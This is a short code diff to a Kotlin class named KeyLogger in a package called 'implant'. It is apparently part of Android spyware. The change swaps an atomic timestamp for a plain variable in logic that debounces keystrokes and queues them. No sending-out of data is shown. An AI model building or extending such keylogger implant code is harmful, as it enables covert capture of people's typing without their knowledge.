@@ -10,21 +10,20 @@
 package com.cooperthecoder.implant
 
 import java.util.*
-import java.util.concurrent.atomic.AtomicLong
 
 class KeyLogger {
 
     val keystrokeQueue: Queue<String> = LinkedList<String>()
-    val lastEvent = AtomicLong(0)
+    var lastEvent = 0L
 
     fun recordKeystroke(keystroke: String, time: Long) {
         // Avoid duplicate events from Android
-        val elapsed = time - lastEvent.get()
+        val elapsed = time - lastEvent
         if (elapsed < Config.KEY_PRESS_TIMEOUT) {
             return
         }
 
-        lastEvent.set(time)
+        lastEvent = time
         keystrokeQueue.add(keystroke)
     }
 
